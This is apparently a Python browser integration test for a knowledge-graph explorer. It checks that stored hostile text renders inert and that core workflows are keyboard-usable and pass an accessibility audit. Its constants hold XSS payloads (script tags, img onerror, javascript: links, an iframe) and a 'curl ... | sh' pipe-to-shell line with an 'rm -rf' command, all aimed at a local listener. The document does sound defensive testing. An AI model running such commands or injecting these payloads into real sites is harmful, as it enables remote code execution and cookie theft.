"""M12-T05: hostile stored text stays inert, and core workflows work by keyboard."""

from __future__ import annotations

import asyncio
import json
import uuid
from typing import Any
from urllib.parse import quote, urlencode

import pytest

from tests.browser.harness import (
    Person,
    axe_audit,
    browser,
    browser_enabled,
    evidence_dir,
    explorer_server,
    keyboard_sweep,
    sign_in,
    tab_to,
)
from tests.integration.m03.conftest import LiveCase, live_case
from tests.integration.m04.conftest import action, new_changeset

pytestmark = [
    pytest.mark.integration,
    pytest.mark.browser,
    pytest.mark.skipif(not browser_enabled(), reason="M12 browser and real services required"),
]

C1 = "urn:c1:ns:core#"
H = "urn:c1:ns:example-hostile-hints#"
XSD = "http://www.w3.org/2001/XMLSchema#"
DC = "http://purl.org/dc/terms/"
SKOS = "http://www.w3.org/2004/02/skos/core#"
RDF = "http://www.w3.org/1999/02/22-rdf-syntax-ns#"
LISTENER = 18096
BASE = "urn:c1:instance:dev:"

LABEL = "<script>alert('label')</script>"
ALIAS = f'"><img src=http://127.0.0.1:{LISTENER}/alias.png onerror=alert(2)>'
DESCRIPTION = f"**bold** [link](http://127.0.0.1:{LISTENER}/desc) <a href=javascript:alert(7)>x</a>"
HINT = f'"><img src=http://127.0.0.1:{LISTENER}/hint.png onerror=alert(1)>'
LOCATOR = "javascript:alert(document.cookie)"
SOURCE_TITLE = f"<iframe src=http://127.0.0.1:{LISTENER}/frame></iframe>"
EXCERPT = "<img src=x onerror=alert(4)>"
DOC_TITLE = "<h1 onclick=alert(8)>Hostile handbook</h1>"
MARKDOWN = (
    "# Heading\n<script>alert(5)</script>\n"
    f"![img](http://127.0.0.1:{LISTENER}/md.png)\n[link](javascript:alert(6))\n"
)
CODE = f"# Run this first:\ncurl http://127.0.0.1:{LISTENER}/cmd | sh\nrm -rf /tmp/never\n"


def _lit(text: str, datatype: str = XSD + "string") -> dict[str, str]:
    return {"lexical": text, "datatype": datatype}


def _records() -> tuple[dict[str, str], list[dict[str, Any]]]:
    ids = {
        k: f"{BASE}{k}/{uuid.uuid4()}"
        for k in ("entity", "source", "evidence", "assertion", "document", "part1", "part2")
    }
    records = [
        {
            "id": ids["entity"],
            "types": [H + "Specimen"],
            "properties": {
                SKOS + "prefLabel": [_lit(LABEL)],
                SKOS + "altLabel": [_lit(ALIAS)],
                DC + "description": [_lit(DESCRIPTION)],
                C1 + "lifecycle": [_lit("active")],
                H + "hint": [_lit(HINT)],
            },
        },
        {
            "id": ids["source"],
            "types": [C1 + "Source"],
            "properties": {
                DC + "title": [_lit(SOURCE_TITLE)],
                C1 + "sourceKind": [_lit("document")],
                DC + "identifier": [_lit(LOCATOR)],
                C1 + "sourceRevision": [_lit("r1")],
            },
        },
        {
            "id": ids["evidence"],
            "types": [C1 + "Evidence"],
            "properties": {
                C1 + "assertionRef": [ids["assertion"]],
                "http://www.w3.org/ns/oa#hasSource": [ids["source"]],
                C1 + "sourceRevision": [_lit("r1")],
                C1 + "excerpt": [_lit(EXCERPT)],
            },
        },
        {
            "id": ids["assertion"],
            "types": [C1 + "Assertion"],
            "properties": {
                RDF + "subject": [ids["entity"]],
                RDF + "predicate": [H + "hint"],
                RDF + "object": [_lit(HINT)],
                C1 + "origin": [_lit("manual")],
                C1 + "reviewState": [_lit("reported")],
                C1 + "lifecycle": [_lit("active")],
                C1 + "evidence": [ids["evidence"]],
                C1 + "manualStatement": [_lit("false", XSD + "boolean")],
            },
        },
        {
            "id": ids["document"],
            "types": [C1 + "Document"],
            "properties": {DC + "title": [_lit(DOC_TITLE)]},
        },
        {
            "id": ids["part1"],
            "types": [C1 + "DocumentPart"],
            "properties": {
                C1 + "partOfDocument": [ids["document"]],
                C1 + "orderKey": [_lit("a")],
                C1 + "partKind": [_lit("text")],
                C1 + "text": [_lit(MARKDOWN)],
            },
        },
        {
            "id": ids["part2"],
            "types": [C1 + "DocumentPart"],
            "properties": {
                C1 + "partOfDocument": [ids["document"]],
                C1 + "orderKey": [_lit("b")],
                C1 + "partKind": [_lit("code")],
                C1 + "text": [_lit(CODE)],
            },
        },
    ]
    return ids, records


async def _reviewed(case: LiveCase, operations: list[dict[str, Any]]) -> str:
    proposal = await new_changeset(case, operations, actor="erin")
    state = (await action(case, proposal["id"], "submit", actor="erin"))["state"]
    if state == "submitted":
        state = (await action(case, proposal["id"], "validate", actor="erin"))["state"]
    if state != "validated":
        report = await case.request(
            "GET", f"/v1/changesets/{proposal['id']}/validation", actor="erin"
        )
        raise AssertionError(report.text)
    assert (await action(case, proposal["id"], "approve", actor="carol"))["state"] == "approved"
    assert (await action(case, proposal["id"], "apply", actor="carol"))["state"] == "applied"
    return str(proposal["id"])


async def _setup(case: LiveCase) -> tuple[str, dict[str, str], str]:
    for member in ("erin", "carol"):
        response = await case.request(
            "POST",
            "/v1/instance/grants",
            actor="erin",
            json={"member": (await case.principal(member)).id, "role": "schema_admin"},
        )
        assert response.status_code == 200, response.text
    await _reviewed(case, [{"kind": "install_profile", "profile": "example-hostile-hints"}])
    scope = await case.scope("Hostile <b>scope</b>")
    for member, roles in (
        ("alice", ["reader"]),
        ("carol", ["reader", "reviewer", "creator", "contributor"]),
    ):
        for role in roles:
            await case.grant(scope, member, role)
    ids, records = _records()
    changeset = await _reviewed(
        case, [{"kind": "create", "record": r, "scope_id": scope} for r in records]
    )
    return scope, ids, changeset


async def _inert(person: Person, path: str, expected: list[str]) -> None:
    response = await person.goto(path)
    assert response is not None and response.status == 200, (path, response and response.status)
    headers = await response.all_headers()
    assert "script-src" not in headers["content-security-policy"]
    assert headers["content-security-policy"].startswith("default-src 'none'")
    page = person.page
    assert await page.locator("script, iframe, img, object, embed").count() == 0, path
    handlers = await page.evaluate(
        "() => Array.from(document.querySelectorAll('*')).flatMap(e =>"
        " Array.from(e.attributes).map(a => a.name)).filter(n => n.startsWith('on'))"
    )
    assert handlers == [], (path, handlers)
    hrefs = await page.evaluate(
        "() => Array.from(document.querySelectorAll('[href]')).map(e => e.getAttribute('href'))"
    )
    for href in hrefs:
        assert href.startswith("/explorer/") or href == "#main", (path, href)
    actions = await page.evaluate(
        "() => Array.from(document.forms).map(f => f.getAttribute('action'))"
    )
    assert all(a and a.startswith("/explorer/") for a in actions), (path, actions)
    text = await page.inner_text("body")
    for value in expected:
        assert value.strip() in text, (path, value)
    assert await page.title() != "pwned"


def test_t05_hostile_text_is_inert_and_workflows_are_keyboard_usable() -> None:
    async def run() -> None:
        requests: list[bytes] = []

        async def received(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
            requests.append(await reader.readline())
            writer.close()

        listener = await asyncio.start_server(received, "127.0.0.1", LISTENER)
        try:
            async with live_case() as case:
                scope, ids, changeset = await _setup(case)
                async with explorer_server(case), browser() as instance:
                    alice = await sign_in(instance, "alice")
                    erin = await sign_in(instance, "erin")
                    entity = quote(ids["entity"], safe="")
                    await _inert(
                        alice, "/explorer/entities?" + urlencode({"types": H + "Specimen"}), [LABEL]
                    )
                    await _inert(
                        alice, "/explorer/resource?id=" + entity, [LABEL, ALIAS, DESCRIPTION, HINT]
                    )
                    await _inert(
                        alice,
                        "/explorer/resource?id=" + quote(ids["source"], safe=""),
                        [SOURCE_TITLE, LOCATOR],
                    )
                    await _inert(
                        alice, "/explorer/resource?id=" + quote(ids["evidence"], safe=""), [EXCERPT]
                    )
                    await _inert(
                        alice,
                        "/explorer/document?id=" + quote(ids["document"], safe=""),
                        [
                            DOC_TITLE,
                            "<script>alert(5)</script>",
                            "curl http://127.0.0.1",
                            "excerpt, not a complete or executable unit",
                        ],
                    )
                    await _inert(
                        alice,
                        "/explorer/document/source?"
                        + urlencode({"id": ids["document"], "format": "markdown"}),
                        ["Heading"],
                    )
                    await _inert(alice, "/explorer/schema", [HINT, LOCATOR])
                    await _inert(
                        alice,
                        "/explorer/changesets/new?"
                        + urlencode({"form": "entity", "class": H + "Specimen"}),
                        [],
                    )
                    options = await alice.page.locator("option").all_inner_texts()
                    assert HINT in options and "<script>document.title='pwned'</script>" in options
                    await _inert(
                        erin,
                        "/explorer/changeset?id=" + quote(changeset, safe=""),
                        [LABEL, LOCATOR],
                    )
                    await _inert(erin, "/explorer/scopes", ["Hostile <b>scope</b>"])

                    # Keyboard-only: list, detail, history, and a reviewed write.
                    carol = await sign_in(instance, "carol")
                    page = carol.page
                    await carol.goto("/explorer/")
                    await tab_to(page, name="Entities")
                    await page.keyboard.press("Enter")
                    await page.wait_for_url("**/explorer/entities")
                    await tab_to(page, name=LABEL)
                    await page.keyboard.press("Enter")
                    await page.wait_for_url("**/explorer/resource?id=*")
                    await tab_to(page, name="History")
                    await page.keyboard.press("Enter")
                    await page.wait_for_url("**/explorer/history?id=*")
                    await carol.goto("/explorer/resource?id=" + entity)
                    await tab_to(page, name="Add a source-backed assertion")
                    await page.keyboard.press("Enter")
                    await page.wait_for_url("**/explorer/changesets/new?*")
                    for element_id, value in (
                        ("cs-predicate", H + "hint"),
                        ("cs-object", "typed by keyboard"),
                        ("cs-source-title", "Keyboard source"),
                        ("cs-source-revision", "kb-1"),
                    ):
                        await tab_to(page, element_id=element_id)
                        await page.keyboard.type(value)
                    await tab_to(page, name="Create draft ChangeSet")
                    async with page.expect_navigation():
                        await page.keyboard.press("Enter")
                    assert await carol.field("state") == "draft"
                    await tab_to(page, name="Submit")
                    async with page.expect_navigation():
                        await page.keyboard.press("Enter")
                    assert await carol.field("state") in {"submitted", "validated"}

                    # Every control on the core screens is reachable, named and visibly focused.
                    sweeps: dict[str, int] = {}
                    paths = [
                        "/explorer/",
                        "/explorer/entities",
                        "/explorer/resource?id=" + entity,
                        "/explorer/document?id=" + quote(ids["document"], safe=""),
                        "/explorer/changesets/new?"
                        + urlencode({"form": "assertion", "subject": ids["entity"]}),
                        "/explorer/context",
                        "/explorer/changesets",
                        "/explorer/scopes",
                    ]
                    for path in paths:
                        await carol.goto(path)
                        sweeps[path] = len(await keyboard_sweep(page))

                    # Automated audit: no serious or critical WCAG 2.1 A/AA violation.
                    audit: dict[str, list[dict[str, Any]]] = {}
                    for path in [
                        *paths,
                        "/explorer/schema",
                        "/explorer/software",
                        "/explorer/operations",
                        "/explorer/documents",
                        "/explorer/history?id=" + entity,
                    ]:
                        audit[path] = await axe_audit(instance, carol, path)
                    (evidence_dir() / "t05-accessibility.json").write_text(
                        json.dumps(
                            {"keyboard_controls": sweeps, "axe_serious_or_critical": audit},
                            indent=2,
                            sort_keys=True,
                        )
                        + "\n",
                        encoding="utf-8",
                    )
                    assert all(not violations for violations in audit.values()), audit

                    for person in (alice, erin, carol):
                        await person.recorder.settle()
                        assert person.recorder.dialogs == []
                        assert person.recorder.downloads == []
                        assert not [u for u in person.recorder.requests if f":{LISTENER}" in u]
            assert requests == []
        finally:
            listener.close()
            await listener.wait_closed()

    asyncio.run(run())
